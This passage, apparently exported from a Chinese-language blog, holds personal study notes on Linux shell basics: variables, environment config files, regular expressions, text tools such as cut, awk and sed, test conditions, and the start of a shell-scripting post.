<li>并非严格意义上的系统环境变量，env不可见，set可见 </li>
<li>默认值（echo $PS1后）：[\u@\h \W]\$</li>
<li>默认提示符是[root@localhost ~]#（即每个shell窗口前的提示信息，</li>
<li>可自定义，但意义不大，默认即可</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>位置参数变量<ul>
<li>$n<ul>
<li>n为数字，$1–$9表第一到第九个参数</li>
<li>$0表示命令本身</li>
<li>10以上的需要用大括号包含，如${10}</li>
<li>运行脚本文件时：./test.sh 11 22 33，则分别对应$0-3，此参数可以在脚本内容中调用</li>
</ul>
</li>
<li>$*<ul>
<li>代表命令行中所有参数</li>
<li>$*把所有参数看作一个整体</li>
</ul>
</li>
<li>$@<ul>
<li>也代表命令行中所有参数</li>
<li>只不过把每个参数区别对待，可理解为一个数组有多个元素</li>
</ul>
</li>
<li>$#<ul>
<li>代表命令行中所有参数的个数（不包括命令本身</li>
</ul>
</li>
</ul>
</li>
<li>预定义变量<ul>
<li>变量名和变量值均不可改，只可传入不同的值</li>
<li>常用预定义变量<ul>
<li>$?<ul>
<li>最后一次执行的、命令的返回状态</li>
<li>若此变量值为0，表上一命令成功执行</li>
<li>若非0，表执行不正确（具体哪个值由命令决定，如命令不存在时爆127，文件未找到爆2</li>
</ul>
</li>
<li>$$<ul>
<li>当前进程的进程号PID</li>
</ul>
</li>
<li>$!<ul>
<li>后台运行的最后一个进程的进程号</li>
</ul>
</li>
</ul>
</li>
<li>接受键盘输入<ul>
<li>read +选项+变量名<ul>
<li>shell脚本中使用，类似py中raw_input()</li>
<li>-p + 提示信息：在等待read输入时，输出提示信息</li>
<li>-t+秒数：不加read会一直等待，加了会指定等待的时间</li>
<li>-n + 字符数：接受到指定的字符数后就会执行，就不用手动按回车</li>
<li>-s：隐藏输入的数据，适用于机密信息（如Linux输入密码时</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>数值运算与运算符<ul>
<li>declare声名变量类型<ul>
<li>declare [+/-] 选项 变量名</li>
<li>-：给变量设定类型属性（与日常思维相反</li>
<li>+：取消变量的类型属性</li>
<li>-i：将变量声明为整数型（integer</li>
<li>-x：将变量声明为环境变量（export也可以</li>
<li>-p：显示指定变量的被声名的类型（如环境变量显示x</li>
</ul>
</li>
<li>数值运算<ul>
<li>方法1（使用declare<ul>
<li>aa=11</li>
<li>bb=22（给aa和bb赋值</li>
<li>declare -i cc=$aa+$bb<ul>
<li>此时cc为33，一般的话是字符串”11+22”</li>
<li>当然也可以为其他运算符</li>
</ul>
</li>
</ul>
</li>
<li>方法2（使用expr或let数值运算工具<ul>
<li>aa=11</li>
<li>bb=22（给aa和bb赋值</li>
<li>dd=$(expr $aa + $bb)<ul>
<li>dd为33</li>
<li>注意加号两侧必须有空格</li>
</ul>
</li>
</ul>
</li>
<li>（推荐）方法三：$((运算式))或$[运算式]<ul>
<li>aa=11</li>
<li>bb=22（给aa和bb赋值</li>
<li>ff=$(($aa+$bb))</li>
<li>或gg=$[$aa+$bb]</li>
</ul>
</li>
</ul>
</li>
<li>常见运算符<ul>
<li>各运算符存在优先级</li>
<li>优先级数目越大，其优先级别越高</li>
<li>可用小括号调整优先级</li>
</ul>
</li>
</ul>
</li>
<li>变量测试与内容替换<ul>
<li>随用随查，知道这回事即可</li>
<li>举例如x=${y-新值}<ul>
<li>若变量y没有设置，则x=新值</li>
<li>若y为空值，则x为空</li>
<li>若变量y设置值，则x=$y</li>
<li>上述逻辑条件反之亦可成立</li>
<li>不推荐记忆使用，了解即可（有相应表格可查看</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="环境变量配置文件"><a href="#环境变量配置文件" class="headerlink" title="环境变量配置文件"></a>环境变量配置文件</h2><ul>
<li>简介<ul>
<li>定义系统默认环境变量，如PATH，PS1，HISTSIZE，保存在此的就会永久生效</li>
<li>source命令<ul>
<li>source+配置文件或 .+配置文件</li>
<li>默认下需要重启系统才可让环境变量配置文件生效，source即可避免重启</li>
</ul>
</li>
<li>主要环境变量配置文件<ul>
<li>/etc/profile</li>
<li>/etc/profile.d/*.sh</li>
<li>/etc/bashrc</li>
<li>～/.bash_profile</li>
<li>～/.bashrc</li>
</ul>
</li>
</ul>
</li>
<li>文件作用<ul>
<li>etc下的针对所有用户，家目录下的只针对当前用户</li>
<li>主要环境变量配置文件<ul>
<li>/etc/profile<ul>
<li>USER变量</li>
<li>LOGNAME变量</li>
<li>MAIL变量</li>
<li>PATH变量</li>
<li>HOSTNAME变量</li>
<li>HISTSIZE变量</li>
<li>umask:</li>
<li>调用/etc/profile.d/*.sh</li>
</ul>
</li>
<li>/etc/profile.d/*.sh</li>
<li>/etc/bashrc</li>
<li>～/.bash_profile</li>
<li>～/.bashrc</li>
</ul>
</li>
</ul>
</li>
<li>其他配置文件和登录信息<ul>
<li>～/.bash_logout（注销时生效的环境变量配置文件<ul>
<li>默认为空</li>
</ul>
</li>
<li>～/bash_history<ul>
<li>保存历史命令</li>
</ul>
</li>
<li>shell登录信息<ul>
<li>本地终端前欢迎信息<ul>
<li>/etc/issue</li>
</ul>
</li>
<li>远程登录前欢迎信息<ul>
<li>/etc/issue.net</li>
<li>转义符在其中不可使用</li>
<li>是否显示此欢迎信息，由ssh的配置文件/etc/ssh/sshd_config决定，加入“Banner /etc/issue.net”才可</li>
</ul>
</li>
<li>登录后欢迎信息<ul>
<li>/etc/motd</li>
<li>本地登录还是远程登录时都会显示</li>
<li>是登录后的</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><ul>
<li>正则与通配符<ul>
<li>其他语言中，通配符只是正则内容的一部分</li>
<li>正则表达式<ul>
<li>在文件中匹配符合要求的字符串</li>
<li>包含匹配<ul>
<li>类似于贪婪模式，尽可能多的匹配</li>
<li>如grep “abc” test.txt，把所有123所在行显示出来</li>
</ul>
</li>
<li>grep、awk、sed等搜索文件内容的命令支持正则</li>
</ul>
</li>
<li>通配符<ul>
<li>系统目录中匹配符合条件的文件名</li>
<li>完全匹配<ul>
<li>如目录下存在aa和aabb两文件，ls aa只会显示aa文件；ls aa*才会全部显示</li>
</ul>
</li>
<li>ls、find、cp等与文件名相关的命令，不支持正则，故只可使用通配符</li>
</ul>
</li>
</ul>
</li>
<li>基础正则表达式（除基础还有扩展<ul>
<li>元字符<ul>
<li>*<ul>
<li>前一个字符匹配0次或任意多次</li>
<li>0次的也会</li>
<li>前一个字符</li>
<li>通配符*表任意字符</li>
</ul>
</li>
<li>.<ul>
<li>匹配除了换行符外任意一个字符</li>
<li>类似通配符中？</li>
</ul>
</li>
<li>^<ul>
<li>匹配行首</li>
<li>^hello，匹配hello开头的</li>
</ul>
</li>
<li>$<ul>
<li>匹配行尾</li>
<li>hello$，匹配hello结尾的</li>
</ul>
</li>
<li>[]<ul>
<li>匹配其中指定的任意一个字符，仅一个</li>
<li>同通配符中｛｝</li>
<li>[0-9]，匹配一个数字</li>
</ul>
</li>
<li>[^]<ul>
<li>匹配除其中指定的 任意一个字符，同上恰相反</li>
<li>[0-9]，匹配一个非数字</li>
</ul>
</li>
<li>\<ul>
<li>转义符，取消特殊字符的特殊含义</li>
</ul>
</li>
<li>{n}<ul>
<li>匹配其前面的字符恰好出现n次</li>
<li>如[0-9]{4}，匹配四个数字</li>
<li>\转义大括号｛</li>
</ul>
</li>
<li>{n,}<ul>
<li>匹配其前面的字符出现大于n次</li>
<li>如[0-9]{4,}，匹配四位以上数字</li>
</ul>
</li>
<li>{n,m}<ul>
<li>匹配其前面的字符出现大于n次，小于m次</li>
<li>如[0-9]{4,8}，匹配4-8位数字</li>
</ul>
</li>
</ul>
</li>
<li>举例<ul>
<li>grep “.*” test.txt，匹配所有内容</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="字符截取命令"><a href="#字符截取命令" class="headerlink" title="字符截取命令"></a>字符截取命令</h2><ul>
<li>cut列提取命令<ul>
<li>cut +选项+文件名<ul>
<li>可以手工指定文件名，也可通过管道符</li>
<li>-f+列号：提取指定列，逗号分隔指定多列</li>
<li>-d+分隔符：按照指定的分隔符分隔列</li>
</ul>
</li>
<li>举例<ul>
<li>cut -f 2,4 test.txt ，提取出24列</li>
<li>cut -d “:” -f 1 /etc/passwd，提取passwd文件第一列，即用户名列，其文件每行以冒号分隔</li>
</ul>
</li>
<li>独立使用意义不大，多与grep搭配<ul>
<li>grep是提取行，cut提取列</li>
<li>cat /etc/passwd | grep /bin/bash | grep -v root | cut -d “:” -f 1</li>
<li>提取出所有可登录用户，shell为/bin/bash的为系统可登录用户</li>
<li>排除root，grep的v选项</li>
</ul>
</li>
<li>cut命令的局限<ul>
<li>文件是一个x行x列的表格，制表符分隔，不可空格，否则cut不可使用</li>
<li>不可识别以空格分隔的，易报错</li>
<li>可识别：制表符或冒号等符号</li>
<li>awk解决此局限，但awk较复杂，简单的能cut就cut，如冒号分隔的</li>
</ul>
</li>
</ul>
</li>
<li>printf标准格式输出命令<ul>
<li>printf +“输出类型及格式” +输出内容<ul>
<li>输出类型<ul>
<li>%ns<ul>
<li>输出字符串</li>
<li>n为数字表示输出几个字符</li>
</ul>
</li>
<li>%ni<ul>
<li>输出整数</li>
<li>n为数字表示输出几个数字</li>
</ul>
</li>
<li>%m.nf<ul>
<li>输出浮点数</li>
<li>m为总位数，n为数位</li>
<li>%8.2f表总共输出8位，2位小数，6位整数</li>
</ul>
</li>
</ul>
</li>
<li>输出格式<ul>
<li>\a：发出警告音</li>
<li>\b：输出退格，及backspace</li>
<li>\f：清屏</li>
<li>\n：换行</li>
<li>\r：回车，即enter</li>
<li>\t：水平输出退格，即tab</li>
<li>\v：垂直输出退格，即tab</li>
</ul>
</li>
</ul>
</li>
<li>其它<ul>
<li>严格来讲并不是字符提取命令，包含于awk</li>
<li>其后不可直接加文件名，其前也不可以有管道符<ul>
<li>利用$()，即先执行其中的命令，其输出结果作为printf的输出内容</li>
<li>如printf  ‘%s’  $(cat test.txt)</li>
</ul>
</li>
<li>不如echo命令方便，也不如cat，cat命令本身做了格式优化</li>
<li>为awk命令使用方便，因awk不可调用echo和cat</li>
<li>awk中支持print和printf<ul>
<li>print在每次输出后自动加换行符，print并不是Linux中的命令</li>
<li>printf需手工加入换行符</li>
</ul>
</li>
</ul>
</li>
<li>举例<ul>
<li>printf ‘%s %s %s\n’ 1 2 3 4 5 6 </li>
<li>分两组，123和456，且换行了</li>
</ul>
</li>
</ul>
</li>
<li>awk命令<ul>
<li>简介<ul>
<li>同cut截取列，但会弥补其缺陷；grep是截取行</li>
<li>awk复杂且功能强大，故有awk编程一说</li>
</ul>
</li>
<li>awk ‘条件1 ｛动作1｝条件2 ｛动作2｝…’  文件名<ul>
<li>单引号扩起来</li>
<li>后可加文件名，前可加管道符</li>
<li>满足条件则执行动作，不加条件时表示总会执行动作</li>
<li>以行为单位先遍历，再根据条件是否符合决定动作的执行与否（自己总结，待验证</li>
<li>条件（pattern<ul>
<li>一般使用关系表达式作为条件</li>
<li>x &gt; 10，判断x是否大于10</li>
<li>x &gt;= 10，</li>
<li>x &lt;= 10，</li>
</ul>
</li>
<li>动作（action<ul>
<li>格式化输出</li>
<li>流程控制语句</li>
</ul>
</li>
</ul>
</li>
<li>举例<ul>
<li>awk ‘｛printf $2 “\t” $6 “\n”｝’ test.txt<ul>
<li>printf需要手动换行</li>
<li>$2表第二列</li>
</ul>
</li>
<li>df -h | awk ‘｛print $1 “\t” $3｝‘<ul>
<li>磁盘使用情况</li>
<li>不加条件时则默认执行动作</li>
</ul>
</li>
<li>awk ‘$2&gt;=20｛printf $2 “\n”｝’ test.txt<ul>
<li>$2表第二列</li>
<li>第二列数据大于20时才执行</li>
</ul>
</li>
</ul>
</li>
<li>BEGIN和END<ul>
<li>处理数据之前或之后执行某动作，属于条件</li>
<li>BEGIN常与FS一起使用，指定分隔符时</li>
</ul>
</li>
<li>FS内置变量<ul>
<li>默认识别的分隔符是制表符或空格，FS可指定</li>
<li>awk ‘BEGIN｛FS=“:”｝｛printf $2 “\t” $6 “\n”｝’  /etc/passwd</li>
<li>以冒号为分隔，打印出其第26行</li>
<li>要加BEGIN，否则第一条数据不会认为以冒号分隔的</li>
</ul>
</li>
</ul>
</li>
<li>sed命令<ul>
<li>简介<ul>
<li>并非截取命令，grep行截取，awk和cut列截取</li>
<li>而是一个流编辑器，将数据进行选取、替换、删除、新增</li>
<li>vim也是编辑器，操作文件内容，不可操作命令输出结果，sed两者都可以（借助管道符</li>
</ul>
</li>
<li>sed +选项+‘动作’+文件名<ul>
<li>动作用单引号扩起来</li>
<li>选项<ul>
<li>-n<ul>
<li>sed默认将所有数据都输出到屏幕</li>
<li>加此选项，会把经过sed处理后的输出到屏幕</li>
</ul>
</li>
<li>-e<ul>
<li>允许对输入数据应用多条sed命令编辑</li>
<li>如，sed -e ‘3a yyy’  ‘2a hello’ test.txt</li>
</ul>
</li>
<li>-i<ul>
<li>默认sed处理后不会影响源文件，只是输出时有所改变</li>
<li>加此i，sed处理后的结果写入源文件，直接修改了源文件，而不是输出至屏幕</li>
<li>存在一定危险性，不建议，sed还是多用于命令结果处理</li>
</ul>
</li>
</ul>
</li>
<li>动作<ul>
<li>一般之前要紧跟行或行范围，如2a，3i</li>
<li>a \<ul>
<li>追加，在当前行后添加一行或多行</li>
<li>添加多行时，除最后一行，每行末都加\表示未完结</li>
</ul>
</li>
<li>c \<ul>
<li>行替换，用c后面的字符串替换原数据行</li>
<li>替换多行时，除最后一行，每行末都加\表示未完结</li>
</ul>
</li>
<li>i \<ul>
<li>插入，在当前行前插入一行或多行</li>
<li>插入多行时，除最后一行，每行末都加\表示未完结</li>
</ul>
</li>
<li>d<ul>
<li>删除指定行</li>
</ul>
</li>
<li>p<ul>
<li>输出制定行</li>
</ul>
</li>
<li>s<ul>
<li>字符串替换</li>
<li>行范围s/旧/新/g（同vim</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>举例<ul>
<li>sed -n ‘2p’ test.txt<ul>
<li>输出第二行</li>
<li>若不加n，在所有数据基础上又打印第二行，第二行重复输出</li>
<li>一般打印时，都跟n</li>
</ul>
</li>
<li>df -h | sed -n ‘2p’<ul>
<li>管道符后以处理上条命令结果</li>
</ul>
</li>
<li>sed ‘2,4d’ test.txt<ul>
<li>删除2-4行，但不修改文件本身</li>
</ul>
</li>
<li>sed ‘2a hello’ test.txt<ul>
<li>第二行后追加hello</li>
</ul>
</li>
<li>sed ‘2i hello \ world‘ test.txt<ul>
<li>第二行前插入两行数据</li>
<li>-i时，直接把修改写入文件</li>
</ul>
</li>
<li>sed ‘2c hello  world‘ test.txt<ul>
<li>行替换，将第二行替换为指定的字符串</li>
</ul>
</li>
<li>字符串替换<ul>
<li>sed ‘s/旧/新/g’ 文件名</li>
<li>sed ‘3s/yes/no/g’ test.txt</li>
<li>在第三行，将yes替换为no</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="字符处理命令"><a href="#字符处理命令" class="headerlink" title="字符处理命令"></a>字符处理命令</h2><ul>
<li>排序命令sort<ul>
<li>sort+选项+文件名<ul>
<li>-f：忽略大小写</li>
<li>-n：以数值型进行排序，默认是字符串型</li>
<li>-r：反向排序</li>
<li>-t：指定分隔符，默认是制表符</li>
<li>-k  n[,m]：按照指定的字段范围排序，n开始m结束；默认到行尾</li>
</ul>
</li>
<li>按每行的第一个字母来排序</li>
<li>举例<ul>
<li>sort /etc/passwd</li>
<li>sort -t “:”  -k 3,3 /etc/passwd（3开头3结尾，即用3字段排序</li>
</ul>
</li>
</ul>
</li>
<li>统计命令wc<ul>
<li>wc+选项+文件名<ul>
<li>-l：只统计行数</li>
<li>-w：只统计单词数</li>
<li>-m：只统计字符数</li>
<li>不加则输出所有，行数，单词数，字符数</li>
</ul>
</li>
<li>也可以用管道符来接收</li>
</ul>
</li>
</ul>
<h2 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h2><ul>
<li>按文件类型进行判断<ul>
<li>-e：只判断文件是否存在</li>
<li>-s：判断文件是否存在，并且是否为空</li>
<li>-x + 文件：判读该文件是否存在，并且是xx文件（是的话返回真<ul>
<li>-d：目录文件</li>
<li>-f：普通文件</li>
<li>-b：块设备文件</li>
<li>-c：字符设备文件</li>
<li>-L：符号链接文件</li>
<li>-p：管道文件</li>
<li>-S：套接字文件</li>
</ul>
</li>
</ul>
</li>
<li>按照文件权限判断<ul>
<li>-xx +文件：判断该文件是否存在，并且是否存在xx权限，（存在xx权限则返回真</li>
<li>-r/w/x：读写执行权限（ugo其中有一个存在此权限就返回真</li>
<li>-u：SUID权限</li>
<li>-g：SGID权限</li>
<li>-k：Sbit权限</li>
</ul>
</li>
<li>两个文件之间进行比较<ul>
<li>文件1 -nt 文件2:文件1的修改时间是否比2新</li>
<li>文件1 -ot 文件2: 文件1的修改时间是否比2旧</li>
<li>文件1 -ef 文件2<ul>
<li>判断文件1和2的Inode号是否一致，即是否是同一个文件；</li>
<li>用于判断硬链接</li>
</ul>
</li>
</ul>
</li>
<li>两个整数之间比较<ul>
<li>整数1 -xx 整数2:  1和2是否xx，若xx则为真</li>
<li>-eq：是否相等</li>
<li>-ne：是否不相等</li>
<li>-gt：是否大于</li>
<li>-lt：是否小于</li>
<li>-ge：是否大于等于</li>
<li>-le：是否小于等于</li>
</ul>
</li>
<li>字符串的判断<ul>
<li>-z 字符串<ul>
<li>字符串是否为空，为空返回真</li>
</ul>
</li>
<li>-n 字符串<ul>
<li>是否为非空</li>
</ul>
</li>
<li>字符串a == 字符串b<ul>
<li>是否相等</li>
</ul>
</li>
<li>字符串a != 字符串b<ul>
<li>是否不相等</li>
</ul>
</li>
</ul>
</li>
<li>多重条件判断<ul>
<li>判断1 -a 判断2<ul>
<li>逻辑与</li>
<li>12都真才真</li>
</ul>
</li>
<li>判断1 -o 判断2<ul>
<li>逻辑或</li>
<li>12有一个为真便真</li>
</ul>
</li>
<li>！判断<ul>
<li>逻辑非</li>
<li>对原判断取反</li>
</ul>
</li>
</ul>
</li>
<li>两种判断格式<ul>
<li>利用test <ul>
<li>test -e /root/install.log</li>
<li>运行后无输出，借用echo $?，来判断上一条是否执行正确，若是0则正确，非0则错误</li>
</ul>
</li>
<li>利用中括号<ul>
<li>中括号右/左必须有括号</li>
<li>[ -e /root/install.log ]</li>
<li>[ 23 -gt 22 ]</li>
</ul>
</li>
<li>两种方式屏幕都无输出<ul>
<li>运行后无输出，借用echo $?，来判断上一条是否执行正确，若是0则正确，非0则错误</li>
<li>[ -e /root/install.log ] &amp;&amp; echo  yes || echo no</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux-shell编程</title>
    <url>/2017/12/25/etc/shell%E7%BC%96%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="shell脚本的建立-amp-运行"><a href="#shell脚本的建立-amp-运行" class="headerlink" title="shell脚本的建立&amp;运行"></a>shell脚本的建立&amp;运行</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li><p>两种方式：</p>
<ul>
<li>shell中输入命令交互执行</li>
<li>保存到sh文件，将其作为程序调用</li>
</ul>
</li>
<li><p>一次执行多条命令，需分号分隔<a id="more"></a>s</p>
</li>
<li><p>命令一行写不完可以换行，用反斜杠（\）来扩充，如</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost root]# echo "this is \</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> long <span class="built_in">command</span><span class="string">"</span></span></span><br><span class="line">this is long command</span><br></pre></td></tr></table></figure>
<ul>
<li>注意：“&gt;”符号是自动产生，而不是自动输入</li>
</ul>
</li>
</ul>
<h2 id="脚本建立"><a href="#脚本建立" class="headerlink" title="脚本建立"></a>脚本建立</h2><ul>
<li><p>shell脚本程序的每行既可以是shell语句，又可以是shell命令</p>
</li>
<li><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash">一个简单例子</span></span><br><span class="line">who</span><br><span class="line">pwd</span><br><span class="line">date</span><br></pre></td></tr></table></figure>
<ul>
<li>注释以#开始，持续到行尾</li>
<li>第一行<code>#! /bin/bash</code> 是注释语句的特殊符号，#!告诉系统其后面的参数是用来执行此文件的程序。</li>
<li><code>/bin/bash</code>是默认的shell执行程序。</li>
</ul>
</li>
</ul>
<h2 id="脚本运行"><a href="#脚本运行" class="headerlink" title="脚本运行"></a>脚本运行</h2><ul>
<li><p>方法1，运行/bin/bash命令并且把脚本文件名作为它的参数。 </p>
<p><code>[root@localhost root]# /bin/bash scp1</code></p>
<ul>
<li>若搜索路径（PATH变量）中已包含/bin目录，可直接bash</li>
</ul>
</li>
<li><p>脚本文件赋予执行权限后，绝对路径或相对路径执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost root]# chmod u+x scp1</span><br><span class="line">[root@localhost root]# ./scp1</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h1 id="shell变量"><a href="#shell变量" class="headerlink" title="shell变量"></a>shell变量</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><ul>
<li>同其他程序设计语言，bash脚本也需要变量存放数据，但不需事先声明</li>
<li>默认下，变量以字符串来存储，即使赋值为数值型</li>
<li>在需要时，shell及其他工具程序可以将字符串形式的数值转化为数值，并进行相关数值运算</li>
</ul>
<h2 id="环境变量-amp-用户自定义变量"><a href="#环境变量-amp-用户自定义变量" class="headerlink" title="环境变量&amp;用户自定义变量"></a>环境变量&amp;用户自定义变量</h2><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><ul>
<li>shell变量两大类型：环境变量和用户自定义变量</li>
<li>自定义变量：只在当前shell环境下有效；环境变量：在整个系统的shell环境中皆有效</li>
</ul>
<h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><ul>
<li><p>环境变量用于定制shell运行环境，保证shell命令正确执行</p>
</li>
<li><p>环境变量会传递到shell的子进程，当前shell进程和其子进程皆有效</p>
</li>
<li><p>大多数环境变量在/etc/profile文件中初始化，而此文件是在用户登录时执行的</p>
</li>
<li><p>常见环境变量：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PATH　　　　　　决定了shell将到哪些目录中寻找命令或程序</span><br><span class="line">HOME　　　　　　当前用户主目录</span><br><span class="line">HISTSIZE　　　　历史记录数</span><br><span class="line">LOGNAME 　　　　当前用户的登录名 </span><br><span class="line">HOSTNAME　　　　指主机的名称</span><br><span class="line">SHELL 　　　　　前用户Shell类型 </span><br><span class="line">LANGUGE 　　　　语言相关的环境变量，多语言可以修改此环境变量</span><br><span class="line">MAIL　　　　　　当前用户的邮件存放目录 </span><br><span class="line">PS1　　　　　　 基本提示符，对于root用户是#，对于普通用户是$</span><br><span class="line">PS2　　　　　　 附属提示符，默认是“&gt;”</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="相关操作"><a href="#相关操作" class="headerlink" title="相关操作"></a>相关操作</h3><ul>
<li><p>查看环境变量</p>
<ul>
<li><code>#set命令和#en命令</code></li>
<li>env只看环境变量</li>
<li>set可查看所有变量，包括用户自定义变量</li>
</ul>
</li>
<li><p>shell脚本中使用自定义变量</p>
<ul>
<li><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">stuname=“lian”</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">export</span> stuname</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>即，将自定义变量设置为环境变量</p>
</li>
</ul>
</li>
<li><p>删除变量用unset命令，如<code>#unset demo</code></p>
</li>
<li><p>设置只读变量用readonly命令，如<code>readonly stuname</code></p>
<ul>
<li>设置为只读后便不可删除或修改，只可重启shell使其被清除掉</li>
</ul>
</li>
<li><p>给变量赋值的时候 “=”左右不能有空格</p>
</li>
<li><p>当把包含空格（不连续）的字符赋值给变量时，要用引号“”引起来。</p>
</li>
</ul>
<h2 id="变量声明-amp-赋值"><a href="#变量声明-amp-赋值" class="headerlink" title="变量声明&amp;赋值"></a>变量声明&amp;赋值</h2><h3 id="变量声明"><a href="#变量声明" class="headerlink" title="变量声明"></a>变量声明</h3><ul>
<li><p>shell编程不一定要声明变量，但有些特殊类型的必须声明</p>
</li>
<li><p>命令语法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">declare [options] [name[=value]]</span><br><span class="line">typeset [options] [name[=value]</span><br></pre></td></tr></table></figure>
<ul>
<li><p>功能：声明变量、初始化变量、设置变量属性</p>
</li>
<li><p>注意：当不加name和value时，会显示指定类型的（options指定）所有shell变量及其变量值</p>
</li>
<li><p>常用选项</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-a     声明“name”是一个数组</span><br><span class="line">-f     声明“name”是一个函数</span><br><span class="line">-i     声明“name”是一个整数</span><br><span class="line">-r     声明“name”是只读的变量</span><br><span class="line">-x     表示每一个“name”变量都可以被子进程访问到，即全局变量</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>举例说明</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost root]# declare –i age=20</span><br><span class="line">[root@localhost root]# declare –rx OS=LINUX</span><br><span class="line">[root@localhost root]# declare –i</span><br><span class="line"><span class="meta">#</span><span class="bash">显示所有整型变量；</span></span><br><span class="line">[root@localhost root]# declare –x</span><br><span class="line"><span class="meta">#</span><span class="bash">显示所有全局变量；</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="变量赋值"><a href="#变量赋值" class="headerlink" title="变量赋值"></a>变量赋值</h3><ul>
<li>格式：变量名=值</li>
<li>注意：等号(=)前后没有空格</li>
<li>举例：<code>x=6</code>，<code>a=&quot;hello world&quot;</code></li>
</ul>
<h2 id="变量引用（即访问）"><a href="#变量引用（即访问）" class="headerlink" title="变量引用（即访问）"></a>变量引用（即访问）</h2><h3 id="变量引用"><a href="#变量引用" class="headerlink" title="变量引用"></a>变量引用</h3><ul>
<li><p>变量名前加$来访问其内容，如</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost root]# aa=123</span><br><span class="line"><span class="meta">#</span><span class="bash">变量赋值</span></span><br><span class="line">[root@localhost root]# echo aa</span><br><span class="line"><span class="meta">#</span><span class="bash">输出字符串aa</span></span><br><span class="line">[root@localhost root]# echo $aa</span><br><span class="line"><span class="meta">#</span><span class="bash">输出变量aa的值123</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>可以用已有变量给新变量赋值</p>
<ul>
<li>变量2=\$变量1</li>
<li>如<code>aa=$bb</code></li>
</ul>
</li>
</ul>
<h3 id="单引号、双引号和反斜杠"><a href="#单引号、双引号和反斜杠" class="headerlink" title="单引号、双引号和反斜杠"></a>单引号、双引号和反斜杠</h3><ul>
<li><p>单引号可引用任意字符或字符串，其中内容均失去特殊含义</p>
</li>
<li><p>双引号类似单引号可引用任意，除<code>$ 反引号 反斜杠</code></p>
<ul>
<li>$可用于变量的引用，用来替换变量</li>
<li>反引号可用于执行shell命令</li>
<li>反斜线则转义</li>
</ul>
</li>
<li><p>反斜杠用于转义特殊字符，使其失去特殊含义，变为一般的字符</p>
</li>
<li><p>举例</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost root]# BOOK=”linux book”</span><br><span class="line">[root@localhost root]# MSG=’$BOOK’</span><br><span class="line">[root@localhost root]# echo $MSG</span><br><span class="line"><span class="meta">$</span><span class="bash">BOOK</span></span><br><span class="line"></span><br><span class="line">[root@localhost root]# msg=’ my name is ’</span><br><span class="line">[root@localhost root]# echo $msg</span><br><span class="line">my name is</span><br><span class="line"></span><br><span class="line">[root@localhost root]# echo “$msg Linux”</span><br><span class="line">my name is Linux</span><br><span class="line">[root@localhost root]# echo \$msg</span><br><span class="line"><span class="meta">$</span><span class="bash">msg</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="命令替换"><a href="#命令替换" class="headerlink" title="命令替换"></a>命令替换</h2><ul>
<li><p>两种形式：<code>$(command) 和 ‘command’（此处为反引号）</code></p>
</li>
<li><p>shell把其替换为这个命令的输出结果。此过程被称为命令替换。</p>
</li>
<li><p>注意：命令替换适用于任何命令</p>
</li>
<li><p>举例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost root]#pwd</span><br><span class="line">/root/d1</span><br><span class="line">[root@localhost root]# cmd1=pwd</span><br><span class="line">[root@localhost root]# echo “The value of command is:$cmd1.”</span><br><span class="line">The value of command is: pwd</span><br><span class="line">[root@localhost root]# cmd1=$(pwd)</span><br><span class="line">[root@localhost root]# echo “The value of command is:$cmd1.”</span><br><span class="line">The value of comomand is: /root/d1</span><br></pre></td></tr></table></figure>
</li>
<li><p>举例2：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">在下面的例子中，在echo命令执行前，date命令的输出就替换了$(date)。</span><br><span class="line">[root@localhost root]# echo “The date and time is $(date).”</span><br><span class="line">The date and time is 9月20日 10:23:16 UTC 2011.</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="输入命令"><a href="#输入命令" class="headerlink" title="输入命令"></a>输入命令</h2><h3 id="read简介"><a href="#read简介" class="headerlink" title="read简介"></a>read简介</h3><ul>
<li><p>使用read命令将用户输入赋值给shell变量（作用类似于python中input函数）</p>
</li>
<li><p>语法：<code>read [options] variable-list</code></p>
</li>
<li><p>常用选项：</p>
